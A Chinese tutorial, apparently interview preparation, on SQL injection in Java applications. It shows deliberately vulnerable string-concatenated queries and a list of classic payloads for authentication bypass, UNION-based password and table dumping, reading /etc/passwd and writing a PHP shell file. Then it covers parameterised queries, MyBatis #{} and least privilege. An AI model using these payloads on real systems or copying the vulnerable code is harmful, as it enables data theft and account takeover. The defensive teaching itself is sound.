# SQL 注入：数据库的隐形杀手

你的程序里有这样一段代码：

```java
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

看起来很正常，对吧？

但如果用户输入的是 `admin' OR '1'='1`，会发生什么？

```java
// 实际执行的 SQL：
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
// 条件永远为真！返回所有用户
```

这就是 **SQL 注入（SQL Injection）**——把用户输入当 SQL 代码执行。

## SQL 注入的原理

SQL 注入的本质和 XSS 一样——**把用户输入当代码执行**。

只不过 XSS 是把输入当 JavaScript 执行，SQL 注入是把输入当 SQL 执行。

```
正常输入：
username = "admin"
SQL = "SELECT * FROM users WHERE username = 'admin'"

注入输入：
username = "admin' OR '1'='1"
SQL = "SELECT * FROM users WHERE username = 'admin' OR '1'='1'"
                                            ↑ 这里被改变了！
```

## SQL 注入的经典类型

### 1. 数字注入

```sql
-- 正常 URL
https://shop.com/product?id=5

-- 注入
https://shop.com/product?id=5 OR 1=1
```

```java
// 后端代码
String sql = "SELECT * FROM products WHERE id = " + request.getParameter("id");
// 实际执行
SELECT * FROM products WHERE id = 5 OR 1=1
```

### 2. 字符串注入

```sql
-- 正常登录
username: admin
password: 123456
SELECT * FROM users WHERE username='admin' AND password='123456'

-- 注入登录
username: admin'--
password: anything
SELECT * FROM users WHERE username='admin'--' AND password='anything'
--' 之后的内容被注释掉了！密码验证被绕过
```

### 3. UNION 注入

```sql
-- 注入获取其他表的数据
username: ' UNION SELECT credit_card FROM users--

SELECT * FROM products WHERE name='prod1'
UNION
SELECT credit_card FROM users--
```

### 4. 报错注入

```sql
-- 利用数据库错误信息
username: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x))--

-- 页面显示错误信息，暴露数据库版本
```

## SQL 注入的危害

```
┌─────────────────────────────────────────────────────────────┐
│                    SQL 注入能做什么                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 认证绕过                                                 │
│     登录框注入，直接登录任意账户                               │
│                                                             │
│  2. 数据窃取                                                 │
│     UNION 注入获取其他表数据（用户、密码、信用卡）             │
│                                                             │
│  3. 数据修改                                                 │
│     UPDATE 注入修改数据（余额、权限）                         │
│                                                             │
│  4. 数据删除                                                 │
│     DELETE 注入删除数据，或 DROP TABLE                        │
│                                                             │
│  5. 命令执行（某些数据库）                                    │
│     MySQL INTO OUTFILE，SQL Server xp_cmdshell               │
│                                                             │
│  6. 读取系统文件                                             │
│     LOAD_FILE() 读取配置文件、密钥                            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## SQL 注入实战：一步一步

```java
// 漏洞代码
@PostMapping("/login")
public Result login(@RequestBody LoginRequest request) {
    String sql = "SELECT * FROM users WHERE username = '" + 
                  request.getUsername() + 
                  "' AND password = '" + 
                  request.getPassword() + "'";
    
    // 攻击者可以：
    // 1. 绕过认证：username = admin'--
    // 2. 获取所有用户：username = ' UNION SELECT * FROM users--
    // 3. 获取密码哈希：username = ' UNION SELECT id,username,password_hash,null,null FROM users--
}
```

### 经典注入 Payload

```sql
-- 绕过认证
' OR '1'='1
' OR 1=1--
admin'--

-- 获取所有记录
' UNION SELECT NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT table_name FROM information_schema.tables--

-- 获取列名
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- 获取管理员密码
' UNION SELECT username,password,null,null FROM users WHERE role='admin'--

-- 文件操作（MySQL）
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT 'hacked' INTO OUTFILE('/var/www/html/shell.php')--
```

## SQL 注入防御

### 1. 参数化查询（Prepared Statements）

**这是最根本的防御方式。**

```java
// ✅ 正确：使用参数化查询
@PostMapping("/login")
public Result login(@RequestBody LoginRequest request) {
    String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
    
    // PreparedStatement 会将参数当作数据处理，永远不会变成 SQL 代码
    PreparedStatement ps = connection.prepareStatement(sql);
    ps.setString(1, request.getUsername());  // 参数 1
    ps.setString(2, request.getPassword());  // 参数 2
    
    ResultSet rs = ps.executeQuery();
}

// ✅ JPA / MyBatis 自动防护
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    
    // Spring Data JPA 自动使用参数化查询
    @Query("SELECT u FROM User u WHERE u.username = :username AND u.password = :password")
    Optional<User> findByUsernameAndPassword(
        @Param("username") String username,
        @Param("password") String password
    );
}

// ✅ MyBatis 参数化查询
@Mapper
public interface UserMapper {
    
    // #{} 自动参数化，不会拼接字符串
    User findByUsername(@Param("username") String username);
}

<!-- UserMapper.xml -->
<select id="findByUsername" resultType="User">
    SELECT * FROM users WHERE username = #{username}
</select>
```

### 2. ORM 框架的防护

```java
// ✅ JPA：天然防护
@Service
public class UserService {
    
    public Optional<User> findByUsername(String username) {
        // Spring Data JPA 自动参数化
        return userRepository.findByUsername(username);
    }
    
    // 自动生成 SQL：
    // SELECT * FROM users WHERE username = ?
}
```

### 3. 输入验证

```java
@Component
public class InputValidator {
    
    private static final Pattern USERNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9_]{3,20}$");
    private static final Pattern EMAIL_PATTERN = Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    
    /**
     * 验证用户名
     */
    public boolean isValidUsername(String username) {
        if (username == null) return false;
        return USERNAME_PATTERN.matcher(username).matches();
    }
    
    /**
     * 验证邮箱
     */
    public boolean isValidEmail(String email) {
        if (email == null) return false;
        return EMAIL_PATTERN.matcher(email).matches();
    }
}

// 控制器层验证
@RestController
public class UserController {
    
    @PostMapping("/register")
    public Result register(@RequestBody @Valid RegisterRequest request,
                          BindingResult bindingResult) {
        // 验证失败
        if (bindingResult.hasErrors()) {
            return Result.error(bindingResult.getFieldError().getDefaultMessage());
        }
        
        // 业务逻辑
        return userService.register(request);
    }
}
```

### 4. 最小权限原则

```sql
-- 数据库账号只授予必要权限
GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'app_user'@'localhost';
-- 不授予 DROP、DELETE、FILE 等危险权限
REVOKE DROP ON myapp.* FROM 'app_user'@'localhost';
REVOKE GRANT OPTION ON myapp.* FROM 'app_user'@'localhost';
```

### 5. 错误信息处理

```java
// ❌ 错误：直接展示数据库错误
} catch (SQLException e) {
    response.getWriter().write("SQL Error: " + e.getMessage());
}

// ✅ 正确：隐藏错误细节
} catch (SQLException e) {
    log.error("Database error", e);
    response.getWriter().write("系统错误，请稍后再试");
}
```

## MyBatis 注入漏洞与修复

```xml
<!-- ❌ 错误：使用 ${} 直接拼接 -->
<select id="findByUsername" resultType="User">
    SELECT * FROM users WHERE username = '${username}'
    <!-- ${} 会直接替换，可被注入 -->
</select>

<!-- ✅ 正确：使用 #{} -->
<select id="findByUsername" resultType="User">
    SELECT * FROM users WHERE username = #{username}
    <!-- #{} 使用参数化查询，安全 -->
</select>

<!-- ⚠️ 特殊情况：ORDER BY -->
<!-- ORDER BY 需要动态列名，不能用 #{} -->
<!-- 解决方案：白名单验证 -->
<select id="findBySort" resultType="User">
    SELECT * FROM users 
    <choose>
        <when test="sort == 'username'">ORDER BY username</when>
        <when test="sort == 'createdAt'">ORDER BY created_at</when>
        <otherwise>ORDER BY id</otherwise>
    </choose>
</select>
```

## 面试追问方向

1. **SQL 注入和 XSS 的区别？** —— SQL 注入攻击数据库（后端），XSS 攻击用户浏览器（前端）
2. **参数化查询为什么能防 SQL 注入？** —— 参数被当作数据处理，不会被解析为 SQL 语句
3. **MyBatis 的 #{ } 和 ${ } 的区别？** —— #{ } 参数化，${ } 直接替换；ORDER BY 等需要动态列名时必须用 ${}，但必须做白名单验证
4. **存储过程能防 SQL 注入吗？** —— 有限防护，存储过程内部拼接字符串仍可注入
5. **ORM 框架能完全防止 SQL 注入吗？** —— 基本安全，但如果使用原生 SQL 或动态查询，仍可能存在漏洞

> "SQL 注入是最古老也最危险 Web 漏洞之一。参数化查询是根本解决方案，永远不要相信用户输入。"
